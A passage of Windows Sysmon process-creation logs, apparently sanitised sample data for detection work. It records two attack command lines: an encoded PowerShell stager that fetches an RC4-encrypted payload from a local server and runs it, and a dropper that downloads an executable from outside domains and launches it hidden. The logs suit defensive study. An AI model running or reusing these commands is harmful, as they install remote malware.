YwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQAbgBVAEwATAAsACQAVABSAHUAZQApAH0AOwBbAFMAeQBTAHQARQBNAC4ATgBFAHQALgBTAEUAcgB2AEkAYwBlAFAATwBpAG4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBuAHQASQBOAFUAZQA9ADAAOwAkAFcAYwA9AE4ARQB3AC0ATwBCAEoAZQBDAFQAIABTAHkAUwBUAEUAbQAuAE4ARQBUAC4AVwBlAGIAQwBsAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAQQBEAEUAcgBTAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQAZQBNAC4ATgBFAHQALgBXAEUAYgBSAGUAcQBVAGUAUwBUAF0AOgA6AEQAZQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AWAB5ADsAJABXAEMALgBQAFIATwBYAHkALgBDAHIARQBEAGUATgB0AGkAQQBMAFMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AQwByAGUARABlAE4AVABJAGEATABDAGEAQwBoAGUAXQA6ADoARABFAGYAYQB1AGwAdABOAEUAVABXAG8AcgBLAEMAUgBlAGQAZQBOAFQASQBBAEwAUwA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAEUAWAB0AC4ARQBuAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBDAC4ASABFAGEAZABlAHIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwA1AEIALwAwAG0AdAB2AGEAeQBPAEUAeABkAGsAagBIADAAdABtAGkAQgBmAEIAYwBTAGMAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAZABBAHQAQQA9ACQAVwBDAC4ARABvAHcAbgBMAG8AQQBkAEQAQQB0AGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAdgA9ACQAZABhAFQAYQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAFQAYQAuAEwAZQBuAGcAdABoAF0AOwAtAGoATwBpAG4AWwBDAGgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "49F1AF32-8951-59C1-0000-0020E7030000",
      "LogonId": "0x000003e7",
      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "49F1AF32-8955-59C1-0000-00105DF90100",
      "ParentProcessId": "1956",
      "ProcessGuid": "49F1AF32-8A86-59C1-0000-0010EB930B00",
      "ProcessId": "1656",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "871621",
      "Execution": {
        "ProcessID": "1336",
        "ThreadID": "1876"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "PowerShell  \"'PowerShell \"\"function Ktuakce([String] $dwjdasoigb){(New-Object System.Net.WebClient).DownloadFile($dwjdasoigb,''C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Yvfytc.exe'');Start-Process ''C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Yvfytc.exe'';}try{Ktuakce(''http://www.events4u.cz/kas23.png'')}catch{Ktuakce(''http://tregartha-dinnie.co.uk/kas23.png'')}'\"\" | Out-File -encoding ASCII -FilePath C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Ryvqma-cgs.bat;Start-Process 'C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\Ryvqma-cgs.bat' -WindowStyle Hidden\"",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\Desktop\\",
      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-4475-59DB-0000-0020B8040100",
      "LogonId": "0x000104b8",
      "ParentCommandLine": "cmd /c PowerShell \"'PowerShell \"\"function Ktuakce([String] $dwjdasoigb){(New-Object System.Net.WebClient).DownloadFile($dwjdasoigb,''%TMP%\\Yvfytc.exe'');Start-Process ''%TMP%\\Yvfytc.exe'';}try{Ktuakce(''http://www.events4u.cz/kas23.png'')}catch{Ktuakce(''http://tregartha-dinnie.co.uk/kas23.png'')}'\"\" | Out-File -encoding ASCII -FilePath %TMP%\\Ryvqma-cgs.bat;Start-Process '%TMP%\\Ryvqma-cgs.bat' -WindowStyle Hidden\"",
      "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
      "ParentProcessGuid": "49F1AF32-5913-59DB-0000-0010023D3100",
      "ParentProcessId": "1564",
      "ProcessGuid": "49F1AF32-5913-59DB-0000-00101D483100",
      "ProcessId": "788",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "230989",
      "Execution": {
        "ProcessID": "2160",
        "ThreadID": "2380"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
